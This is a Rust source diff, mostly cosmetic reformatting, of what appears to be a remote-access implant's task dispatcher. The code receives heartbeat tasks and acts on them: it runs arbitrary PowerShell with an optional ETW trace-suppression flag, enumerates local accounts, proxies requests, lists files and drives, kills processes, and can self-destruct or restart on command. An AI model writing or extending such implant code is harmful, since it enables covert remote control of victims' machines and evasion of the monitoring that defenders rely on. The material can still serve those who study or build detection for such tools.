@@ -74,7 +74,8 @@ pub(crate) async fn handle_task(
             return;
         }
     }
-    libra_common::dlog!("[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
+    libra_common::dlog!(
+        "[RECV] task | id={} | type={:?} | cmd={} | timeout={}s",
         task.id,
         task.command_type,
         task.command,
@@ -158,7 +159,8 @@ fn wrap_result(task_id: &str, output: &str) -> String {
         "success": success,
         "output": output,
         "error": null,
-    }).to_string()
+    })
+    .to_string()
 }
 
 /// Map a heartbeat task to a module entry (or a direct response). Called while
@@ -188,7 +190,10 @@ async fn resolve_task(
         }
         CommandType::PowerShell => {
             // arguments 支持 "etwSuppress=true"（ETW 痕迹抑制，默认关）
-            let suppress_etw = task.arguments.iter().any(|a| a.eq_ignore_ascii_case("etwSuppress=true"));
+            let suppress_etw = task
+                .arguments
+                .iter()
+                .any(|a| a.eq_ignore_ascii_case("etwSuppress=true"));
             let input = serde_json::json!({
                 "script": task.command.clone(),
                 "timeoutSeconds": if task.timeout_seconds > 0 { task.timeout_seconds } else { 60 },
@@ -197,10 +202,18 @@ async fn resolve_task(
             run("powershell".to_string(), input).await
         }
         CommandType::LocalAccounts => {
-            run("recon".to_string(), serde_json::json!({ "op": "local_accounts" })).await
+            run(
+                "recon".to_string(),
+                serde_json::json!({ "op": "local_accounts" }),
+            )
+            .await
         }
         CommandType::Proxy => {
-            run("proxy".to_string(), serde_json::json!({ "url": task.command, "method": "GET" })).await
+            run(
+                "proxy".to_string(),
+                serde_json::json!({ "url": task.command, "method": "GET" }),
+            )
+            .await
         }
         CommandType::FileList => {
             let input = serde_json::json!({ "op": "list", "path": task.command, "limit": 1000 });
@@ -210,8 +223,10 @@ async fn resolve_task(
             let drives = blocking_val(|| {
                 let executor = libra_platform::get_executor();
                 executor.get_drives()
-            }).await;
-            let escaped: Vec<String> = drives.iter()
+            })
+            .await;
+            let escaped: Vec<String> = drives
+                .iter()
                 .map(|d| format!(r#""{}""#, d.replace('\\', "\\\\")))
                 .collect();
             let json = format!(r#"{{"drives":[{}]}}"#, escaped.join(","));
@@ -219,7 +234,9 @@ async fn resolve_task(
         }
         CommandType::Generic => {
             // 通用模块执行：command = 模块名，arguments[0] = 输入 JSON
-            let input = task.arguments.first()
+            let input = task
+                .arguments
+                .first()
                 .and_then(|a| serde_json::from_str::<serde_json::Value>(a).ok())
                 .unwrap_or_else(|| serde_json::json!({}));
             run(task.command.clone(), input).await
@@ -244,23 +261,24 @@ async fn resolve_task(
         CommandType::Kill => {
             // Kill specific process by PID (cloud recon module)
             if let Ok(pid) = task.command.parse::<u32>() {
-                run("recon".to_string(), serde_json::json!({ "op": "kill", "pid": pid })).await
+                run(
+                    "recon".to_string(),
+                    serde_json::json!({ "op": "kill", "pid": pid }),
+                )
+                .await
             } else {
                 TaskOutcome::DoneWrapped(r#"{"error":"Invalid PID"}"#.to_string())
             }
         }
-        CommandType::Sleep => {
-            TaskOutcome::DoneWrapped(r#"{"status":"sleeping"}"#.to_string())
-        }
-        CommandType::KillAndClean => {
-            TaskOutcome::Destroy
-        }
-        CommandType::Restart => {
-            TaskOutcome::Restart
-        }
+        CommandType::Sleep => TaskOutcome::DoneWrapped(r#"{"status":"sleeping"}"#.to_string()),
+        CommandType::KillAndClean => TaskOutcome::Destroy,
+        CommandType::Restart => TaskOutcome::Restart,
         _ => {
             // Unknown command type — respond with generic ok
-            TaskOutcome::DoneWrapped(format!(r#"{{"status":"ok","commandType":"{:?}"}}"#, task.command_type))
+            TaskOutcome::DoneWrapped(format!(
+                r#"{{"status":"ok","commandType":"{:?}"}}"#,
+                task.command_type
+            ))
         }
     }
 }
